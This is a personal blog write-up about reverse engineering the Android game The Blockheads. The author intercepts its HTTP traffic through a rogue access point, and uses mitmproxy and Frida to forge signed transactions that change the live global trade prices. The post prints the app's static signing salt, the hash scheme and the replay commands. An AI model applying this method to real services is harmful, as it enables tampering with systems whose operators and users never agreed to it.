---
layout: post
title:  "Crash the economy, jetpacks for everyone"
date:   2016-06-28 00:00:00 +0000
category: Hacking
tags: [Android, Reversing]
---
## About this app
On a rainy Saturday I was bored so I decided to reverse some parts of my favorite Android game: [The Blockheads](https://play.google.com/store/apps/details?id=com.noodlecake.blockheads).
The Blockheads is a Minecraft-like game that lets you explore the world, mine for resources, build structures, craft some items and sell them in a trade portal for in-game currency.
Selling and buying items does not only affect your price, but also affects the **global** trade portal price.
This means that if you for example sell 200 lanterns, the global price for lanterns will go down and lanterns will become cheaper for everyone (according to
[the law of supply and demand](https://en.wikipedia.org/wiki/Supply_and_demand)).
The goal today will be to reverse engineer how transactions get sent to the priceserver and make some fake transactions to change the global price.

![Normal tradeportal](/assets/images/tradeportal_normal.min.png)

# 1. Recon

## How prices get modified
I set up a [wireless MitM access point]({% post_url 2016-06-26-setting-up-a-rogue-AP %}).
I then fired up Wireshark and looked at the packets and noticed two types of HTTP requests to `priceserver.theblockheads.net`:

+ HTTP GET request to `/get_prices_v2.php`. The server responded with a JSON object full of itemIDs and prices.
  This probably updates the prices of your local tradeportal.
{% gist redfast00/2be41ea00c4d44cbf751ce8d58709a1e %}

+ HTTP POST request to `/send_prices.php`. The content of the request is a JSON object containing a worldID and transactions.
  This probably updates the global price after a local transaction in the tradeportal.
{% gist redfast00/3340dd21be60a1af8f7105e54f9905da %}

## Capturing the packets for a later replay
I configured mitmproxy to use the wireless AP and captured the HTTP streams using:

```bash
mitmdump -T --port 8080 -w transactions.flow
```

# 2. Client-side exploitation

## Finding out what itemID belongs to what item
I saw that the price updates (GET requests) and the transactions (POST requests) contained references to itemIDs.
There was one problem: I had no idea what item corresponded to what itemID. After a bit of googling, I came across
[the official viewer for The Blockheads trade portal prices](http://blockmarket.theblockheads.net/). Guess what? The links to see the 24 hour details of items contain the itemID. Awesome!

## Intercepting and modifying prices client side
Since the GET requests are served over HTTP (unencrypted/unauthenticated), I could just MitM the GET requests,
change some prices and forward the modified packets to device. I quickly banged up a mitmproxy python script that sets the price of stone
high and all other prices ridiculously low:

```bash
mitmdump -T -q -s "rich.py"
```

{% gist redfast00/7d7ad28a7995ff81b8d62e3c7c982669 %}

![Cheap tradeportal](/assets/images/tradeportal_cheap.min.png)

Awesome, it worked. I can now buy as much jetpacks as I want, but all other players still have to pay full price...
That doesn't seem too fair, so I wanted to make jetpacks *really* cheap.

# 3. Server-side exploitation

## Intercepting and modifying (part I)
Okay, this seemed fairly straightforward: I just had to replay and modify an intercepted transaction:

```bash
mitmdump -n -c transactions.flow
```

Awesome, that modified the global trade portal price. I then tried to write a script to arbitrarily modify prices:

```bash
mitmdump -n -c transactions.flow -s "send_prices_first_try.py 17 200"
## This will try to buy 200 lanterns (itemID = 17)
## Actually, it won't
```

{% gist redfast00/166ac9a94ce28004cac2f1512b746130 %}

Crap, that didn't modify the global price... I apparently overlooked something.

After making some more transactions from my test device, I figured out that there was an HTTP `Hash`
header which was different in every POST request. Since I could just replay requests, the `Hash` header probably wasn't time-sensitive.
In order to figure out how the Hash value was generated, I tried to reverse engineer the app.

## Reversing an Android app
I first extraced and downloaded the app from my device to my computer using `adb`:

```bash
adb shell pm path com.noodlecake.blockheads
#> package:/data/app/com.noodlecake.blockheads-1/base.apk
adb pull /data/app/com.noodlecake.blockheads-1/base.apk TheBlockheads-1.6.1.apk
```
I then unpacked the app using [apktool](http://ibotpeaches.github.io/Apktool/).

```
apktool d ~/TheBlockheads-1.6.1.apk ~/blockheads/unpacked
```

While inspecting the unpacked app director, I noticed that the `AndroidManifest.xml`
contained a bunch of keys that contained "apportable":

```xml
<meta-data android:name="apportable.expansion.main.version" android:value="1452614214" />
<meta-data android:name="apportable.expansion.main.size" android:value="63343672" />
<meta-data android:name="apportable.expansion.patch.version" android:value="0" />
<meta-data android:name="apportable.expansion.patch.size" android:value="0" />
<meta-data android:name="apportable.splash_screen_type" android:value="letterbox" />
<meta-data android:name="apportable.orientation" android:value="portrait" />
<meta-data android:name="apportable.opengles2" android:value="true" />
<meta-data android:name="apportable.opengles.fast_color" android:value="true" />
<meta-data android:name="apportable.arm_neon" android:value="true" />
<meta-data android:name="apportable.abi_list" android:value="armv7a armv7a-neon" />
```

I concluded that the app was probably built using [apportable](http://www.apportable.com/) and was
(according to apportable’s home page) written in Objective-C or Swift.
This means that the juicy parts of the app are probably inside native libraries. And indeed:

```
lib
└── armeabi-v7a
    ├── libApplication.so
    ├── libAudioFile.so
    ├── libAudioToolbox.so
    ├── libAudioUnit.so
    ├── libBridgeKit.so
    ├── libCFNetwork.so
    ├── libCommonCrypto.so
    ├── libCoreAudio.so
    ├── libCoreFoundation.so
    ├── libCoreGraphics.so
    ├── libCoreText.so
    ├── libcrypto_1_01h.so
    ├── libcxx.so
    ├── libFoundation.so
    ├── libgles_apportable.so
    ├── libGraphicsServices.so
    ├── libicu.so
    ├── libNoodleCompatibility.so
    ├── libNoodleFoundation.so
    ├── libOpenAL.so
    ├── libpango.so
    ├── libSecurity.so
    ├── libssl_1_01h.so
    ├── libSystemConfiguration.so
    ├── libSystem.so
    ├── libv.so
    └── libxml2.so
```

and:

```bash
strings blockheads/unpacked/lib/armeabi-v7a/libApplication.so | grep "priceserver"
#> http://priceserver.theblockheads.net/get_price_graph_data.php?item_id=%d
#> http://priceserver.theblockheads.net/send_prices.php
#> http://priceserver.theblockheads.net/get_prices_v2.php
```

I then listed all imports in `libApplication.so` looking for something that looked like a hash function using [radare2](http://radare.org/r/):

```bash
r2 libApplication.so
```

```
[0x0015ef40]> ii | grep "type=FUNC"
```

This returned two possible candidates: `CC_MD5` and `CFHash`. After a quick search, `CFHash` was eliminated.
I then instrumented the `CC_MD5` function using [Frida](http://frida.re). After reading the [CC_MD5 docs](https://developer.apple.com/library/ios/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CC_MD5.3cc.html), I wrote a Frida JS script which shows the input and output of `CC_MD5` every time it's called.

{% gist redfast00/e1ce5675d66fee600eeb2db46bec402f %}

```bash
frida-trace -U com.noodlecake.blockheads -i CC_MD5
```

```
7ba0ce9d53ce2ac394915efdbdb3505273vjaclg3287tdskjtrade_v_1{"worldID":"7ba0ce9d53ce2ac394915efdbdb35052","transactions":{"17":1}}
7ba0ce9d53ce2ac394915efdbdb3505273vjaclg3287tdskjtrade_v_1{"worldID":"7ba0ce9d53ce2ac394915efdbdb35052","transactions":{"17":2}}
7ba0ce9d53ce2ac394915efdbdb3505273vjaclg3287tdskjtrade_v_1{"worldID":"7ba0ce9d53ce2ac394915efdbdb35052","transactions":{"17":-2}}
```

I then stared at the string for a minute and figured out how the `Hash` header is formed (in pseudo-code):

```python
MD5(worldID +  "73vjaclg3287tdskjtrade_v_1" + JSON_transactions)
```

(I confirmed that "73vjaclg3287tdskjtrade_v_1" is a static by running `strings` on `libApplication.so`)

## Intercepting and modifying (part II)
I knew everyhing I needed: I typed up a mitmdump python script to change the transactions in the saved flows:

{% gist redfast00/3c20dc0c19c79b10f78580eaab0e13e6 %}

```bash
mitmdump -n -c transactions.flow -s 'send_prices.py 17 200'
## This will try to buy 200 lanterns (itemID = 17)
## It just might work
```

The price of lanterns went up: it worked! I am now able to modify prices without actually buying anything. Mission accomplished.

![Jetpacks for everyone](/assets/images/oprah_giving.min.jpg)
